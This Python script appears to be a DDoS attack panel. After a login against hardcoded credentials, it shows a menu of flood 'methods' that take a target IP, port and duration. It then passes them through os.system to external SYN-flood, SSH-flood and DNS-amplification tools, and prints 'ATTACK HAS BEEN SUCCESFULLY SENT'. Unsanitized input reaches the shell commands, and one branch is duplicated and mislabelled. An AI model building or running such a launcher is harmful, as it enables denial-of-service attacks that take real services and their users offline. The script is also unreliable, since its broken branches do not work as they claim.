import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

#proxys = open('proxies.txt').readlines()
#bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
                  (\__.-. |
                  == ===_]+
                          |
 ` - .
       ` - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                     (\__.-. |
                     == ===_]+
                             |
 ` - .
       ` - .
            >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                         (\__.-. |
                         == ===_]+
                                 |
 ` - .
       ` - .
            - 
              ` >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - 
      ....       `   ....           ....           ....
     ||          >-> ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
	clear()
	print(f'         \x1b[38;2;255;215;0m[Resemble Home Holder')
	print("")
	
def methods():
    clear()
    si()
    print(f'''
\x1b[38;2;255;3;248m
\x1b[38;2;255;3;248m                            ╔╦╗╔═╗╔╦╗\x1b[38;2;113;3;255m╦ ╦╔\x1b[38;2;3;79;255m═╗╔╦╗\x1b[38;2;255;51;255m╔═╗
\x1b[38;2;255;3;248m                            ║║║║╣  ║ \x1b[38;2;113;3;255m╠═╣║\x1b[38;2;3;79;255m ║ ║║\x1b[38;2;255;51;255m╚═╗
\x1b[38;2;255;3;248m                            ╩ ╩╚═╝ ╩ \x1b[38;2;113;3;255m╩ ╩╚\x1b[38;2;3;79;255m═╝═╩╝\x1b[38;2;255;51;255m╚═╝
\x1b[38;2;255;3;248m
\x1b[38;2;255;3;248m                                                       HOME METHODS    
\x1b[38;2;255;3;248m                                                      ╔════════════╗
\x1b[38;2;255;3;248m                                                           RAIL
\x1b[38;2;255;3;248m                                                           LDAP       
''')
def menu():
	clear()
	si()
	print(f'''
Type "help" or methods" to see methods

''')
def attack():
    clear()
    print(f"/ ")
    time.sleep(0.8)
    clear()
    print(f"| ")
    time.sleep(0.8)
    clear()
    print(f"- ")
    time.sleep(0.8)
    clear()
    print(f"\ ")
    time.sleep(0.8)
    clear()
    print(f"| ")
    time.sleep(0.8)
    clear()
    print(f"- ")
    time.sleep(0.8)
    print("")
    time.sleep(3)


def main():
    menu()
    while(True):
        cnc = input('''  ''')
        if cnc == "methods" or cnc == "METHODS" or cnc == "?":
            methods()
        elif cnc == "back" or cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls" or cnc == "BACK":
            menu()

        elif "RAIL" in cnc:
            try:
                IP = cnc.split()[1]
                PORT = cnc.split()[2]
                TIME = cnc.split()[3]
                attack()
                print(f'''
\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
''')

                time.sleep(3)
                os.system(f'perl TCP-SYN.pl {IP} {PORT} 65500 {TIME}')
            except IndexError:
                print("Usage: RAIL <ip> <port> <time> ")
                print("Example: RAIL 71.71.71.71 3658 300")
        elif "LDAP" in cnc:
            try:
                IP = cnc.split()[1]
                PORT = cnc.split()[2]
                TIME = cnc.split()[3]
                attack()
                print(f'''
\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
''')
                time.sleep(3)
                os.system(f'perl TCP-SYN.pl {IP} {PORT} 65500 {TIME}')
            except IndexError:
                print("Usage: LDAP <ip> <port> <time> ")
                print("Example: LDAP 71.71.71.71 3658 300")

        elif "100UP" in cnc:
            try:
                IP = cnc.split()[1]
                PORT = cnc.split()[2]
                TIME = cnc.split()[3]
                attack()
                print(f'''
\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
''')
                time.sleep(3)
                os.system(f'./100UP-SSH {IP} {PORT} 1025 {TIME}')
            except IndexError:
                print("Usage: 100UP <ip> <port> <time> ")
                print("Example: 100UP 70.70.70.9 80 300")

        elif "CHAOS" in cnc:
            try:
                IP = cnc.split()[1]
                PORT = cnc.split()[2]
                TIME = cnc.split()[3]
                attack()
                print(f'''
\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
''')
                time.sleep(3)
                os.system(f'./100UP-SSH {IP} {PORT} 1025 {TIME}')
            except IndexError:
                print("Usage: TCP-RAW <ip> <port> <time> ")
                print("Example: TCP-RAW 70.70.70.9 80 300")
        elif "CHAOS" in cnc:
            try:
                IP = cnc.split()[1]
                PORT = cnc.split()[2]
                TIME = cnc.split()[3]
                attack()
                print(f'''
\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
''')
                time.sleep(3)
                os.system(f'dnsamp.c {IP} {PORT} 1025 {TIME}')
            except IndexError:
                print("Usage: DNS-AMP <ip> <port> <time> ")
                print("Example: DNS-AMP 70.70.70.9 80 300")

try:
    users = ["king", "zxt", "root", "Alaska", "Rocket Kitty"]
    clear()
    username = getpass.getpass ("Username: ")
    if username in users:
        user = username
    else:
        print ("[*]\033[31mIncorrect\033[97m, Exiting.")
        exit()
except KeyboardInterrupt:
    print ("\nCtrl-C Has Been Pressed.")
    exit()
try:
    passwords = ["king", "applesrunu", "root", "20272301", "5772"]
    password = getpass.getpass ("Password: ")
    if user == "king":
        if password == passwords[0]:
            print ("[*] Login Correct. :)")
            time.sleep(3)
            clear()
            try:
                clear()
                ascii_vro()
                main()
            except KeyboardInterrupt:
                print ("\n Ctrl-C Has Been Pressed.")
                menu()
        else:
            print ("[*]\033[31mIncorrect\033[97m, Exiting.")
            exit()
    if user == "zxt":
        if password == passwords[1]:
            print ("[*] Login Correct. :)")
            time.sleep(3)
            clear()
            try:
                clear()
                ascii_vro()
                main()
            except KeyboardInterrupt:
                print ("\n Ctrl-C Has Been Pressed.")
                menu()
        else:
            print ("[*]\033[31mIncorrect\033[97m, Exiting.")
            exit()
    if user == "root":
        if password == passwords[2]:
            print ("[*] Login Correct. :)")
            time.sleep(3)
            clear()
            try:
                clear()
                ascii_vro()
                main()
            except KeyboardInterrupt:
                print ("\n Ctrl-C Has Been Pressed.")
                menu()
        else:
            print ("[*]\033[31mIncorrect\033[97m, Exiting.")
            exit()
except KeyboardInterrupt:
    exit()
